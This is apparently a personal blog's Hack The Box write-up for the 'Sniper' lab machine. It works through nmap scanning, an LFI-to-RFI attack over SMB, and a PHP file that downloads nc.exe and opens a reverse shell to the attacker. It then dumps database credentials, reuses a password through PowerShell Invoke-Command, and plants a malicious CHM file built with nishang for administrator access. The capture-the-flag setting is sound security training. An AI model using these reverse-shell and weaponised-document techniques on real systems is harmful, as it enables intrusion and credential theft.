---
title: Hack The Box - Sniper
date: 2020-03-29 15:00:00 +0800
categories: [hackthebox]
tags: [php, smb, chm, windows]
---

![](/assets/images/sniper.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.151 sniper.htb" >> /etc/hosts
```

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
```bash
$ nmap -sV -sT -sC sniper.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-27 11:11 EDT
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.65% done
Nmap scan report for sniper.htb (10.10.10.151)
Host is up (0.27s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h02m46s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-27T22:15:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.42 seconds
```

# Enumeration (1)

Port 80 seems like a good place to start.

![](/assets/images/sniper1.png) 

There was a login and a registration page:

`/user/login.php and /user/registration.php`

![](/assets/images/sniper2.png) 


We can register a new account and login with it but to be only presented with this :(

`/user/index.php`

![](/assets/images/sniper3.png) 


There was also a blog page:

`/blog/index.php`

![](/assets/images/sniper4.png) 

But then when we view it in other languages by clicking on the options in the "Language" dropdown menu:

![](/assets/images/sniper5.png) 

We see that it is trying to include other `.php` files for different languages! Maybe we can do some local file inclusion (LFI)?

![](/assets/images/sniper6.png) 

I tried setting `?lang=index.php`, only to realise that it would cause the server to recursively include `index.php` endlessly. Hence, we know that LFI is possible here.

# Exploitation (1)

I tried many LFI techniques seen [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) but most of them didn't work. It was as if there was some validation going on to prevent LFI. 

That was when I was thinking: hmm... this is a Windows box right? What happens if we try to include a file in a `SMB` share? That was when I saw this in the same link:

![](/assets/images/sniper7.png) 

Lets test out this theory.

First, I create a new folder on my Desktop:
```bash
$ mkdir ~/Desktop/fileshare
```

And then configured my `Samba` config to create a new `SMB` share called `public`:
```bash
$ cat /etc/samba/smb.conf
...
[public]:
	force user = nobody
	path = /root/Desktop/fileshare
	public = yes
```

With that done, I create a `.php` file in it :
```bash
$ cat /root/Desktop/fileshare/phpinfo.php
<?php phpinfo(); ?>
```

And start my `smbd` service:
```bash
$ systemctl start smbd
```

Now if we browse to `/blog/?lang=\\10.10.XX.XX\public\phpinfo.php`:

![](/assets/images/sniper8.png)

We have successfully upgraded from LFI to remote file inclusion (RFI) :)

Nows lets try to establish a reverse shell back to us. Since `PHP` reverse shells are sometimes a little wonky , I'm going to upload a `nc.exe` and use it to connecting back to our listener.

Starting a webserver:
```bash
$ mkdir ~/Desktop/web
$ cp /usr/share/windows-resources/binaries/nc.exe ~/Desktop/web
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Creating a `.php` file to download `nc.exe` and connect back to us:
```bash
$ cat /root/Desktop/fileshare/rev.php
<?php
# Create a temp dir
system("mkdir C:\\tmp");
# Download nc.exe
system("curl http://10.10.XX.XX/nc.exe > C:\\tmp\\nc.exe");
# Establish reverse shell
system("C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337");
?>
```

Starting our listener:
```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

Triggering our `.php` script and getting a shell:
```bash
$ curl 'http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\shell.php'
```

```
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 50128
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>whoami
whoami
nt authority\iusr
```

# Enumeration (2)

Listing local users:
```
C:\inetpub\wwwroot\blog>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Chris                    DefaultAccount           
Guest                    WDAGUtilityAccount       
The command completed with one or more errors.
```

Seems like the `user.txt` is residing in `Chris` but we do not know his credentials.

Looking around, I found MySQL credentials in `C:\inetpub\wwwroot\users`:
```
C:\inetpub\wwwroot\user>type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

and also saw how the `login` feature for the website was implemented:
```
<?php
require('db.php');
session_start();
// If form submitted, insert values into the database.
if (isset($_POST['username'])){
        // removes backslashes
        $username = stripslashes($_REQUEST['username']);
        //escapes special characters in a string
        $username = mysqli_real_escape_string($con,$username);
        $password = stripslashes($_REQUEST['password']);
        $password = mysqli_real_escape_string($con,$password);
        //Checking is user existing in the database or not
        $query = "SELECT * FROM `users` WHERE username='$username'
and password='".md5($password)."'";
        $result = mysqli_query($con,$query) or die(mysql_error());
        $rows = mysqli_num_rows($result);
        if($rows==1){
            $_SESSION['username'] = $username;
            // Redirect user to index.php
            header("Location: index.php");
         }else{
...
```

From this, we can tell that some possible usernames and passwords are stored in the `users` table in the columns `username` and `password` so lets try to dump them out:

Creating a `.php` file to dump out the `users` table:
```bash
$ cat ~/Desktop/fileshare/dump.php
<?php
$conn = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
$sql = "SELECT * from users";
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    // output data of each row
    while($row = mysqli_fetch_assoc($result)) {
        print_r($row);
    }
} else {
    echo "0 results";
}
mysqli_close($conn);
?>
```

Viewing the results:
```bash
$ curl 'http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\dump.php'
...
Array
(
    [id] => 1
    [username] => superuser
    [email] => admin@sniper.co
    [password] => 6e573c8b25e9168e0c61895d821a3d57
    [trn_date] => 2019-04-11 22:45:36
)
...
```

Putting the hash into Google (Yes Google), turns out it was the MD5 hash of `$uperpassw0rd`.

Using `smbmap`, I decided to manually test possible pairs of credentials since the password list was short:
```bash
smbmap -H sniper.htb -u Chris -p "$uperpassw0rd"
[+] Finding open SMB ports....
[!] Authentication error on sniper.htb
[!] Authentication error on sniper.htb
root@kali:~/Desktop# smbmap -H sniper.htb -u Chris -p 36mEAhz/B8xQ~2VM
[+] Finding open SMB ports....
[+] User SMB session established on sniper.htb...
[+] IP: sniper.htb:445  Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
		...
        IPC$                                                    READ ONLY       Remote IPC
```

Alright, we got Chris's credentials. To login into `Chris`, we will need to do something like a `su` or `sudo` in Linux but for Windows! In Powershell, there is a cmdlet called [`Invoke-Command`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7) which allows you to specify who to run as using `-Credential` or `-Session`.

Testing `Invoke-Command`:
```
C:\inetpub\wwwroot\blog>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\inetpub\wwwroot\blog> $SecPassword = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
PS C:\inetpub\wwwroot\blog> $Cred = New-Object System.Management.Automation.PSCredential('.\Chris', $SecPassword)
PS C:\inetpub\wwwroot\blog> $TestPCSession = New-PSSession -Credential $Cred
PS C:\inetpub\wwwroot\blog> Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c whoami}
sniper\chris
```

It works! We were able to run commands as `chris`! Now lets try to establish another reverse shell as `chris`.

# user.txt

Starting our listener:
```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

And running `nc.exe` to connect back to us:
```
PS C:\inetpub\wwwroot\blog> Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c C:\tmp\nc.exe -e cmd.exe 10.10.XX 1337}
```

```
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49687
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents>whoami
whoami
sniper\chris
C:\Users\Chris\Documents>type C:\Users\Chris\Desktop\user.txt
type C:\Users\Chris\Desktop\user.txt
21f4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

Looking around, I found a file in `chris`'s download folder:

```
C:\Users\Chris\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Downloads

04/11/2019  08:36 AM    <DIR>          .
04/11/2019  08:36 AM    <DIR>          ..
04/11/2019  08:36 AM            10,462 instructions.chm
               1 File(s)         10,462 bytes
               2 Dir(s)  17,988,661,248 bytes free
```

Using `nc.exe`, I downloaded the `instructions.chm` file and opened it in a Windows VM.

Starting our listener:
```bash
$ nc -lvnp 1337 > instructions.chm
listening on [any] 1337 ...
```

Sending the file over:
```
C:\Users\Chris\Downloads>C:\tmp\nc.exe 10.10.XX.XX 1337 < instructions.chm
```

![](/assets/images/sniper9.png) 

Looks like we have a disgrunted employee here haha but nothing much here.

I also found a folder called `C:\Docs`:
```
C:\Docs>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Docs

10/01/2019  01:04 PM    <DIR>          .
10/01/2019  01:04 PM    <DIR>          ..
04/11/2019  09:31 AM               285 note.txt
04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,993,322,496 bytes free
```

In the `note.txt`:
```
Hi Chris,
Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```

Wow what a tough boss... Hmm... Could the `instructions.chm` be the documentation that the boss is talking about? If we try copying the `instructions.chm` to `C:\Docs`:

```
C:\Docs>copy C:\Users\Chris\Downloads\instructions.chm . 
copy C:\Users\Chris\Downloads\instructions.chm . 
        1 file(s) copied.

C:\Docs>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Docs

03/29/2020  06:38 AM    <DIR>          .
03/29/2020  06:38 AM    <DIR>          ..
04/11/2019  08:36 AM            10,462 instructions.chm
04/11/2019  09:31 AM               285 note.txt
04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
               3 File(s)        563,354 bytes
               2 Dir(s)  17,974,849,536 bytes free
```

And after a while, it disappeared!
```
C:\Docs>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Docs

03/29/2020  06:38 AM    <DIR>          .
03/29/2020  06:38 AM    <DIR>          ..
04/11/2019  09:31 AM               285 note.txt
04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,974,861,824 bytes free
```

It is possible that the CEO is retrieving the file and opening it. Using `nishang`'s [`Out-CHM.ps1`](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1), we can actually generate a malicious `.chm` that run arbitrary commands.

# root.txt

First we will need to install [`HTML Help Workshop`](https://www.microsoft.com/en-sg/download/details.aspx?id=21138).

![](/assets/images/sniper10.png) 

After some testing on my local machines, I managed to generate the correct `.chm` file:

```powershell
PS C:\Users\rizemon\Desktop> Import-Module .\Out-CHM.ps1
PS C:\Users\rizemon\Desktop> Out-CHM -Payload "C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
Microsoft HTML Help Compiler 4.74.8702

Compiling c:\Users\root\Desktop\doc.chm


Compile time: 0 minutes, 0 seconds
2       Topics
4       Local links
4       Internet links
0       Graphics


Created c:\Users\rizemon\Desktop\doc.chm, 13,438 bytes
Compression increased file by 142 bytes.
```

After transfering the `doc.chm` to my Kali's web server directory, I uploaded it to `C:\Docs` as `instructions.chm`.

```
C:\Docs>curl http://10.10.XX.XX/doc.chm > instructions.chm
curl http://10.10.XX.XX/doc.chm > instructions.chm
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 13436  100 13436    0     0  13436      0  0:00:01 --:--:--  0:00:01 18687
```

And started our listener:

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

After a while, the `instructions.chm` disappeared and look at what we got on our listener!

```
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49709
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
sniper\administrator

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
5624XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !
